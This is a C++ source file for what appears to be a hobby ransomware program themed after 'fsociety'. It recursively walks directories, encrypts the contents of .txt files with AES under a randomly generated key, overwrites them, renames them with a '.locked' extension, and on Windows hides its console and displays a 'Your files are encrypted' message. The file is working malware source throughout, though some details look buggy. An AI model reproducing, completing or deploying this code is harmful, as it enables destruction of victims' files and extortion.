#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <fstream>
#include "cryptopp/osrng.h"
#include "cryptopp/modes.h"
#include "cryptopp/aes.h"
#include "cryptopp/filters.h"
#include "fsociety.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_)
#define WIN32_WINNT 0x0500
    #include <windows.h>
#include <strsafe.h>
#pragma comment(lib, "User32.lib")

#endif

using namespace CryptoPP;
using namespace std;


void DisplayErrorBox(const char* lpszFunction)
{
    // Retrieve the system error message for the last-error code

    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    // Display the error message and clean up

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
        (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
    StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error %d: %s"),
        lpszFunction, dw, lpMsgBuf);
    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
}

string fsociety::number_to_string(int x){
    if(!x) return "0";
        string s,s2;
        while(x){
            s.push_back(x%10 + '0');
            x/=10;
        }
    reverse(s.begin(),s.end());
    return s;
}

int fsociety::listfiledirectory(char *directory){

#if !(defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_))
    WIN32_FIND_DATAA ffd;
    LARGE_INTEGER filesize;
    char szDir[MAX_PATH];
    size_t length_of_arg;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;

    if (strlen(directory) == 0)
    {
        printf(" -- \n Directory name not specified --\n");
        return (-1);
    }

    StringCchCopyA(szDir, MAX_PATH, directory);
    StringCchCatA(szDir, MAX_PATH, "\\*");

    hFind = FindFirstFileA(szDir, &ffd);

    if (INVALID_HANDLE_VALUE == hFind)
    {
        printf("FindFirstFile --\n");
        return dwError;
    }

    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
           printf("  %s   <DIR>\n", ffd.cFileName);
        }
        else
        {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            printf("  %s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
        }
    } while (FindNextFileA(hFind, &ffd) != 0);

    dwError = GetLastError();
    if (dwError != ERROR_NO_MORE_FILES)
    {
        printf("FindFirstFile");
    }

    FindClose(hFind);
    return dwError;

#else
    DIR *dir;
    struct dirent *entry;
    if((dir = opendir(directory)) != NULL){
	while((entry = readdir(dir)) != NULL){
	    if(strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name,".") != 0)
	    {
		// concat three char*
		size_t len_folder = strlen(directory);
		size_t len_name = strlen(entry->d_name);
		size_t len_slash = strlen(this->slash);
		char *concat = (char *) malloc(len_folder + len_slash + len_name + 1);
		memcpy(concat, directory, len_folder);
		memcpy(concat + len_folder, this->slash, len_slash);
		memcpy(concat + len_folder + len_slash,entry->d_name, len_name);
		concat[len_folder + len_slash + len_name] = '\0';
		//
		if(is_directory(concat) == 1)
		{
		    this->listfiledirectory(concat);	    
		}
		else
		{
		    //cout << entry->d_name << endl;
		    this->open_file(concat);
		}
	    }
	}
	closedir(dir);
    }
    //std::cout << "start : " << this->nb_file << std::endl;
#endif
    return 0;
}

int fsociety::is_directory(char *path)
{
    DIR *dir;
    if((dir = opendir(path)) != NULL)
    {
	closedir(dir);
	    return 1;
    }
    return 0;
}

int fsociety::lock_file(char *path){
    const char *locked_ext = ".locked";
    size_t len_path = strlen(path);
    size_t len_locked = strlen(locked_ext);
    char *new_name = (char *) malloc((len_path + len_locked + 1));
    if (new_name) {
        memcpy(new_name, path, len_path);
        memcpy(new_name + len_path, locked_ext, len_locked);
        new_name[len_path + len_locked + 1] = '\0';
        int res = true;
        res = rename(path, new_name);
        this->nb_file++;
        if (new_name) {
            free(new_name);
        }

        return 0;
    }
    return 1;
}

byte* fsociety::generate_key(void){
    
    AutoSeededRandomPool rnd;
    byte* key = new byte[AES::DEFAULT_KEYLENGTH+1];
    rnd.GenerateBlock(key, AES::DEFAULT_KEYLENGTH);
    key[AES::DEFAULT_KEYLENGTH] = '\0';
    return key;
}

byte* fsociety::generate_iv(void){
    AutoSeededRandomPool rnd;
    byte* iv = new byte[AES::BLOCKSIZE+1];
    rnd.GenerateBlock(iv, AES::BLOCKSIZE);
    iv[AES::BLOCKSIZE] = '\0';
    return iv;
}

byte* fsociety::encrypt(byte* iv, byte* key, int keyLength, byte* data, int dataLength)
{
    byte* out = new byte[dataLength];
    CFB_Mode<AES>::Encryption cfbEncryption(key, keyLength, iv);
    cfbEncryption.ProcessData(out, data, dataLength);
    return out;
}

byte* fsociety::decrypt(byte* iv, byte* key, int keyLength, byte* cipher, int cipherLength)
{
    byte* plain = new byte[cipherLength];
    CFB_Mode<AES>::Decryption cfbDecryption(key, keyLength, iv);
    cfbDecryption.ProcessData(plain, cipher, cipherLength);
    return plain;
}

byte* fsociety::fucksociety(char *input){
    byte* iv = this->generate_iv();
    byte* key = this->generate_key();
    this->secret_key = key;
    this->secret_iv = iv;
    int len = strlen(input);
        
    byte* init = reinterpret_cast<byte*>(input);
    byte* cipher = this->encrypt(iv, key, AES::DEFAULT_KEYLENGTH, init,len);
    byte* plain = this->decrypt(iv, key, AES::DEFAULT_KEYLENGTH, cipher, len);

    return cipher;
}

int fsociety::encrypt_file(char *path, const char *content){
    
    byte* encrypt = this->fucksociety((char*)content);
    //cout << "encrypt : " << encrypt << endl;
    ofstream fichier(path, ios::out | ios::trunc);
    if(fichier.is_open()){
	    fichier << encrypt;
	    //cout << "encrypted" << endl;
	    fichier.close();
    }
    int ret = this->lock_file(path);
 
    return 0;
}

int fsociety::open_file(char *path){
    char *content_char;
    string content;
    string final_content;
    ifstream fichier(path, ios::in);

    if(fichier.is_open()){
	    while(getline(fichier, content))
	    {
	        //cout << content << endl;
	        final_content = final_content + content;
	    }
        fichier.close();
	    //size_t len_content = strlen(content);
	    //memcpy(content_modified, content, len_content);
	    content_char = (char*)final_content.c_str();
	    if(strstr(path, ".txt") != NULL){
	        if(strstr(path,".locked") == NULL){
		    this->encrypt_file(path, content_char);
	        }
	    }

	return 0;

    }

    return 1;
}

byte* fsociety::get_secret_key(void){
    return this->secret_key;
}

byte* fsociety::get_secret_iv(void){
    return this->secret_iv;
}

#if defined(WIN32)
int fsociety::show_democracy(void){
    ::MessageBoxW(0, L"Your files are encrypted", L"#OPdailyallowance", 0);
    return 0;
}

int fsociety::hide_console(void){
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    return 0;
}
#endif
